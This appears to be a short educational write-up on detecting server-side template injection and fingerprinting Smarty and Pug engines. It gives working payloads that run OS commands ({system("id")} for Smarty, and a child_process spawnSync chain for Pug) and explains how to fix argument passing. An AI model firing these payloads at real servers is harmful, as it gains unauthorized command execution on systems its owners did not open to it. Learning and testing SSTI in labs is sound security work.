![project ssti](identification.png)

## Identifying Server-Side Template Injection (SSTI)

SSTI can be identified by injecting simple template expressions and observing how the server processes them. A common first test is an arithmetic expression like *${7*7}* or *{{7*7}}*.
Follow the green lines if the payload worked or follow red line.
If the response evaluates to 49, template execution is likely occurring.

If the expression is rendered as plain text, the input is probably not vulnerable.

Further payloads using template-specific syntax (such as comments {* *}, string operations, or function calls) help narrow down the template engine (e.g., Smarty, Jinja2, Twig).
The image above illustrates a step-by-step decision flow to detect SSTI and identify the underlying template engine.


## PHP - Smarty

After confirming that the payload *${7*7}* is evaluated (returns 49), we can attempt template-specific payloads to identify the engine and confirm exploitation.

Smarty supports modifiers, such as upper:
```
{'Hello'|upper}
```
If the output is returned in uppercase (HELLO), this strongly indicates Smarty.

To further confirm and demonstrate impact, we can attempt command execution using the system function:
```
{system("id")}
```
If this returns system user information, it clearly confirms Smarty SSTI with command execution capability.

## Node.js – Pug (Jade)

Server-Side Template Injection (SSTI) in Pug can be identified by testing JavaScript interpolation.
A common detection payload is:
```
#{7*7}

```
If the expression is evaluated and returns 49, it indicates that Pug (formerly Jade) is in use, as Pug allows direct JavaScript execution inside #{}.

## Command Execution

Since Pug templates execute JavaScript, we can leverage Node.js internals to execute system commands.
A basic payload to list files is:
```
#{root.process.mainModule.require('child_process').spawnSync('ls').stdout}

```
If this returns output, command execution is confirmed.
```
## Why spawnSync('ls -lah') Does Not Work
```
Using:

spawnSync('ls -lah')

does not work as expected because spawnSync does not split a single string into a command and its arguments. Instead, it treats the entire string as the command name, which causes execution to fail.

## The correct function signature is:
```
spawnSync(command, [args], [options])
```

### command: the executable to run (string)

### args: an array of arguments

### options: optional execution settings

## Correct Payload with Arguments

To properly execute ls -lah, the command and arguments must be separated:
```
#{root.process.mainModule.require('child_process').spawnSync('ls', ['-lah']).stdout}

```
If successful, this confirms Pug SSTI leading to arbitrary command execution.
